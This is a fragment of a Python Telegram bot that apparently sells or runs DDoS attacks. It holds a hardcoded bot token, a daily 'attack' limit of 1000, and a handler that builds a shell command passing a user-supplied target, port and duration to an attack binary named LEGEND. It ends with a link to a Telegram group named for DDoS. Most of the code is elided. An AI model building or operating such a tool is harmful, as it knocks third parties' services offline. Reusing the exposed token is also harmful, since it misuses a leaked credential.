...
bot = telebot.TeleBot('7327706145:AAGhJ86odTbPwkyhsreWhyJ2zs4JANTcS3A')
...
ATTACK_LIMIT = 1000  # Max attacks per day
...
def handle_attack(message):
    ...
    full_command = f"./LEGEND {target} {port} {time_duration}"
...
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/ddosbysrk) 🚀🔥"""
